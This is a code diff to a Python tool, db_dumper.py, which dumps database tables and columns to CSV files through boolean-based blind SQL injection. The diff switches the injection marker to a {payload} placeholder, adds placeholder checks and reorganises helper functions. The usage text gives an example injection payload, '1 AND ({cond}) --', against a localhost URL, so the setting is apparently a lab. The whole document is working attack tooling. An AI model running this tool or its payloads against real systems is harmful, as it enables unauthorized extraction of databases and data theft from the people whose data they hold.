@@ -5,10 +5,9 @@ import argparse
 import csv
 import re
 import sys
-from argparse import Namespace
 from pathlib import Path
 
-from boolean_extractor import extract_string
+from boolean_extractor import run_query
 
 # The extractor intentionally handles printable ASCII (32-126), so delimiters
 # must also be printable. They should not occur in the schema names used here.
@@ -16,36 +15,9 @@ ROW_SEPARATOR = "~"
 COLUMN_SEPARATOR = "|"
 
 
-def quote_identifier(identifier):
-    """Quote a SQLite identifier without allowing it to alter the query."""
-    return '"' + identifier.replace('"', '""') + '"'
-
-
-def table_filename(table):
-    """Keep database-derived names inside the output directory."""
-    safe_name = re.sub(r"[^A-Za-z0-9_.-]", "_", table)
-    return f"{safe_name or 'table'}.csv"
-
-
-def extractor_args(args, query):
-    return Namespace(
-        url=args.url,
-        method=args.method,
-        data=args.data,
-        payload=args.payload,
-        query=query,
-        true_string=args.true_string,
-        false_string=args.false_string,
-        true_status=args.true_status,
-        headers=args.headers,
-        cookies=args.cookies,
-        timeout=args.timeout,
-    )
-
-
 def extract(args, query):
-    """Run one query through the existing boolean extractor."""
-    return extract_string(query, extractor_args(args, query))
+    # get the output of a query from the boolean extractor
+    return run_query(query, args)
 
 
 def split_result(value, separator):
@@ -70,6 +42,10 @@ def enumerate_columns(args, table):
         "ORDER BY cid"
     )
     return split_result(extract(args, query), ROW_SEPARATOR)
+
+
+def quote_identifier(identifier):
+    return '"' + identifier.replace('"', '""') + '"'
 
 
 def dump_table(args, table, columns):
@@ -105,9 +81,15 @@ def dump_table(args, table, columns):
     return rows
 
 
+def get_safe_table_filename(table):
+    # substitute anything not in the whitelist with an underscore
+    safe_name = re.sub(r"[^A-Za-z0-9_.-]", "_", table)
+    return f"{safe_name or 'table'}.csv"
+
+
 def write_table_csv(table, columns, rows, output_dir):
-    """Write one extracted table to a CSV file."""
-    output_path = output_dir / table_filename(table)
+    # write one extracted table to a CSV file
+    output_path = output_dir / get_safe_table_filename(table)
     with output_path.open("w", newline="", encoding="utf-8") as csv_file:
         writer = csv.writer(csv_file)
         writer.writerow(columns)
@@ -122,7 +104,7 @@ def build_parser():
         epilog="""
 Example:
   python db_dumper.py \\
-      -u "http://localhost:8080/restaurant/*" \\
+      -u "http://localhost:8080/restaurant/{payload}" \\
       --payload "1 AND ({cond}) --" \\
       --max-rows 100
         """,
@@ -131,7 +113,7 @@ Example:
         "-u",
         "--url",
         required=True,
-        help="Target URL; use * as the GET injection marker.",
+        help="Target URL containing {payload} where the injection goes.",
     )
     parser.add_argument(
         "-m",
@@ -169,10 +151,15 @@ def main():
     if "{cond}" not in args.payload:
         print("[!] Payload must contain the {cond} placeholder", file=sys.stderr)
         return 2
+    if "{payload}" not in args.url and args.method == "GET":
+        print("[!] GET URL must contain the {payload} placeholder", file=sys.stderr)
+        return 2
+    if args.method == "POST" and (not args.data or "{payload}" not in args.data):
+        print("[!] POST data must contain the {payload} placeholder", file=sys.stderr)
+        return 2
     if not (args.true_string or args.true_status or args.false_string):
         print(
-            "[!] Boolean extraction requires --true-string, --true-status "
-            "or --false-string",
+            "[!] Boolean extraction requires either --true-string, --true-status or --false-string",
             file=sys.stderr,
         )
         return 2
